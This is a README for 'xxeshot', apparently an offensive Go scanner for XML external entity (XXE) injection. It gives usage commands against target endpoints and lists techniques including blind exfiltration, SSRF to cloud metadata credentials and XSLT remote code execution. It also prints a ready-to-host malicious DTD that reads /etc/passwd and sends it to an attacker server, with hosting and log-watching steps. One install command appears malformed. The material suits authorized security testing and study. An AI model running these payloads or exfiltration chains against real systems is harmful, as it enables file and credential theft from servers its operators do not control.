# xxeshot 🎯

**XXE Injection Scanner — Bug Bounty Edition 2026**

A fast, framework-aware XXE vulnerability scanner written in Go. Like nuclei but purpose-built for XXE across every parser, framework, and attack technique.

```
  ██╗  ██╗██╗  ██╗███████╗███████╗██╗  ██╗ ██████╗ ████████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
   ╚███╔╝  ╚███╔╝ █████╗  ███████╗███████║██║   ██║   ██║
   ██╔██╗  ██╔██╗ ██╔══╝  ╚════██║██╔══██║██║   ██║   ██║
  ██╔╝ ██╗██╔╝ ██╗███████╗███████║██║  ██║╚██████╔╝   ██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝
```

---

## Install

```bash
go install -v github.com/xxeshot/xxeshot/cmd/xxeshot@latest

go install -v https://github.com/hunterrsec/XXE.git
```

Or build from source:

```bash
git clone https://github.com/xxeshot/xxeshot
cd xxeshot
go build -o xxeshot ./cmd/xxeshot/
./xxeshot -h
```

---

## Features

| Feature | Description |
|---|---|
| **All Techniques** | classic, blind, oob, xinclude, xslt, ssrf, error-based, cdata |
| **All Frameworks** | java, php, python, dotnet, nodejs, ruby, go, scala, soap, saml, svg, office |
| **Burp Collaborator** | Native OOB detection via `-cb your.burpcollaborator.net` |
| **interact.sh** | Free OOB alternative via `-oob xxeshot.interact.sh` |
| **Blind Data Exfil** | Auto-generates `evil.dtd` content for your hosting server |
| **Error-Based** | Local DTD technique — works with zero outbound connectivity |
| **WAF Bypass** | UTF-7, HTML entities, newline obfuscation payloads built-in |
| **Multi-format Output** | text, JSON, JSONL — pipe into other tools |
| **Concurrency** | `-c 50` threads + `-rl 150` rate limit |
| **Burp Proxy** | `-proxy http://127.0.0.1:8080 -k` for Burp integration |

---

## Quick Start

```bash
# Basic scan — classic + xinclude + OOB detection
xxeshot -u https://target.com/api/parse

# Full scan with all techniques + Burp Collaborator
xxeshot -u https://target.com/upload -at -cb abc123.burpcollaborator.net

# Blind OOB with interact.sh (free)
xxeshot -u https://target.com/soap -t oob,blind -oob YOUR_ID.oast.fun

# Scan SOAP endpoint with framework filter
xxeshot -u https://target.com/service -fw soap,java -t classic,oob,ssrf

# SAML SSO testing
xxeshot -u https://target.com/sso/acs -fw saml -t classic,blind

# SVG upload XXE
xxeshot -u https://target.com/upload -fw svg -ct "image/svg+xml"

# Bulk scan with output
xxeshot -l urls.txt -at -oob YOUR_ID.interact.sh -o results.jsonl -of jsonl

# Pipe + silent mode (only print findings)
cat urls.txt | xxeshot -t classic,xinclude -silent

# Through Burp proxy (for manual verification)
xxeshot -u https://target.com/api -proxy http://127.0.0.1:8080 -k -v

# Custom body template (inject into JSON wrapper)
xxeshot -u https://target.com/api \
  -d '{"xml": "{XXE_PAYLOAD}"}' \
  -ct "application/json" \
  -t classic
```

---

## Techniques

| ID | Technique | Description |
|---|---|---|
| `classic` | Classic File Read | Direct entity substitution reflected in response |
| `oob` | OOB HTTP Detection | Burp Collaborator / interact.sh callback |
| `blind` | Blind DTD Exfil | External DTD chain → data in HTTP request to your server |
| `xinclude` | XInclude | No DOCTYPE needed — inject in XML fragments |
| `xslt` | XSLT Injection | `document()` + Java Xalan RCE |
| `ssrf` | SSRF | AWS/GCP/Azure metadata, internal ports |
| `error` | Error-Based | Local DTD + forced parse error leaks data |
| `cdata` | CDATA Bypass | Wrap output in CDATA to evade filters |

---

## Frameworks

| ID | Targets |
|---|---|
| `java` | DocumentBuilderFactory, SAXParser, DOM4J, JAXB, Spring MVC, XPath |
| `php` | SimpleXML, DOMDocument, XMLReader, php://filter, expect:// |
| `python` | lxml, minidom, SAX, ElementTree |
| `dotnet` | XmlDocument, XmlReader, XDocument, DataSet.ReadXml |
| `nodejs` | libxmljs, xml2js, fast-xml-parser, xmldom |
| `ruby` | Nokogiri, REXML, LibXML |
| `go` | encoding/xml, etree |
| `scala` | scala.xml, Play Framework |
| `soap` | SOAP Envelope, WS-Security, WSDL |
| `saml` | SAMLResponse assertions |
| `svg` | SVG image upload |
| `office` | XLSX workbook.xml, DOCX word/document.xml |

---

## Blind XXE Setup

For blind data exfiltration, host an `evil.dtd` on your server.
xxeshot prints the exact DTD content at startup when OOB is configured:

```bash
xxeshot -u https://target.com/api -t blind -dtd https://yourserver.com
```

xxeshot outputs:
```
[INF] Evil DTD to host at https://yourserver.com/evil.dtd:
[INF] <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://yourserver.com/?data=%file;'>">
      %eval;
      %exfil;
```

Host it:
```bash
echo '<!ENTITY % file SYSTEM "file:///etc/passwd">...' > evil.dtd
python3 -m http.server 80
```

Monitor:
```bash
# Watch incoming requests:
tail -f /var/log/nginx/access.log | grep "data="
```

---

## Output Formats

```bash
# JSON output (one finding per line)
xxeshot -u https://target.com -of jsonl -o findings.jsonl

# Pipe findings into jq
xxeshot -l urls.txt -silent -of json | jq '.evidence'

# Text report
xxeshot -u https://target.com -o report.txt
```

---

## Integration with Other Tools

```bash
# With subfinder + httpx
subfinder -d target.com | httpx -silent | xxeshot -t classic,oob -silent

# With waybackurls (find XML endpoints historically)
waybackurls target.com | grep -E '\.(xml|wsdl|asmx|php)' | xxeshot -t classic

# With gau (GetAllUrls)
gau target.com | xxeshot -t xinclude,classic -silent

# Feed Burp findings
# Export XML endpoints from Burp sitemap, then:
cat burp_targets.txt | xxeshot -at -cb your.collab.net -proxy http://127.0.0.1:8080 -k
```

---

## Detection Patterns

xxeshot checks responses for:

- `/etc/passwd` content (`root:x:0:0`)
- Windows `win.ini` markers
- `/proc/version` Linux version strings
- AWS IMDS credentials and instance metadata
- GCP/Azure metadata responses
- Redis, Elasticsearch, Kubernetes API responses
- PHP base64 filter output
- Java/SAX parse error messages with file content
- JWT tokens and AWS access key patterns

---

## Legal Notice

> For authorized security testing and bug bounty research only. Always obtain written permission before scanning. The authors are not responsible for misuse.

---

## Contributing

PRs welcome for:
- New payload templates
- OOB server integrations (interact.sh API, Collaborator polling)
- Framework-specific detectors
- WAF bypass variants
